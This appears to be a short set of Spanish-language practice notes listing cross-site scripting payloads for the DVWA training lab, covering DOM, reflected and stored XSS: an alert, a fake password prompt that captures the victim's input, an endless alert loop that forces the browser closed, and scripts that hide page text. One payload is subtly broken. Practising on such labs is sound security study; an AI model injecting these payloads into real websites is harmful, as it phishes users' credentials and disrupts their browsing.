// XSS DOM - CROSS SITE SCRIPTING 

<script>alert('ha sido hackeado')</script>;

//------------------------------------------------------------------------------------------------

// XSS Reflected - CROSS SITE SCRIPTING

// en el campo para rellena el nombre en la pagina vulnerable DVWA se  ingresa
<script></script>;
//Luego en la URL es donde el Atacante introduce un script completo y se lo envia a la victima
<script> var Clave = prompt('Ingresa tu clave: '); </script>;
// luego en la consola se captura la clave 
console.log(Clave);

//Se crea la variable Nombre donde la victima ingresa su nombre y al darle aceptar se crea un bucle que le indica que es incorrecto y para cerrarlo solo debes cerrar el navegador
<script> var Nombre = prompt('Ingresa tu nombre: '); while(Nombre){alert('Es incorrecto, intente de nuevo.')} </script>;

//------------------------------------------------------------------------------------------------


// XSS Stored - CROSS SITE SCRIPTING

// Aqui se genera un scrpit que cambie el color de las letras a blancas para que no se puedan ver
<script>document.body.style.color="white"</script>;

// Aqui se genera un scrpit que cambie el color de fondo del body 
<script>body.style.backgroundcolor="white"</script>;